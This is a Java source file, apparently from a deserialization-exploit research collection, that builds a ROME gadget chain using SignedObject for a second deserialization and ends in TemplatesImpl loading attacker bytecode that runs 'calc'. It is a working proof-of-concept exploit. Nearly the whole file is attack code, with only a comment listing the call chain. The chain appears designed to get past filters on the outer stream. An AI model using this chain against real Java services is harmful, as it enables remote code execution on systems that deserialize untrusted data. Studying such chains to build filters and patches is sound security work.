package gadget.doubleunser;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;
import javassist.CannotCompileException;
import javassist.NotFoundException;
import util.GadgetUtils;
import util.ReflectionUtils;
import util.SerializerUtils;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.security.*;
import java.util.HashMap;
import java.util.Hashtable;

/*
* Hashtable#readObject
* EqualsBean#equals
* EqualsBean#beanEquals
* SignedObject#getObject
* 二次反序列化
** BadAttributeValueExpException#readObject
* ToStringBean#toString
* TemplatesImpl-->getOutputProperties()
	TemplatesImpl-->newTransformer()
        TemplatesImpl-->getTransletInstance()
            TemplatesImpl-->defineTransletClasses()
                TemplatesImpl-->defineClass()
*
* */
public class rometoSignedObject2 {
    public static void main(String[] args) throws NoSuchAlgorithmException, NotFoundException, CannotCompileException, IOException, NoSuchFieldException, InstantiationException, IllegalAccessException, ClassNotFoundException, SignatureException, InvalidKeyException {

        TemplatesImpl templates = GadgetUtils.createTemplatesImpl("calc");
        ToStringBean toStringBean2 = new ToStringBean(Templates.class,templates);

        BadAttributeValueExpException badAttributeValueExpException2 = new BadAttributeValueExpException(null);
        ReflectionUtils.setFieldValue(badAttributeValueExpException2,"val",toStringBean2);

        //二次反序列化
        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject = new SignedObject(badAttributeValueExpException2, kp.getPrivate(), Signature.getInstance("DSA"));

        //触发SignedObject#getObject
        EqualsBean bean = new EqualsBean(String.class, "r");
        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("yy", bean);
        map1.put("zZ", signedObject);
        map2.put("zZ", bean);
        map2.put("yy", signedObject);
        Hashtable table = new Hashtable();
        table.put(map1, "1");
        table.put(map2, "2");
        ReflectionUtils.setFieldValue(bean, "_beanClass", SignedObject.class);
        ReflectionUtils.setFieldValue(bean, "_obj", signedObject);

        byte[] payload = SerializerUtils.serialize(table);


        ObjectInputStream ois = new MyInputStream(new ByteArrayInputStream(payload));
        ois.readObject();
    }
}
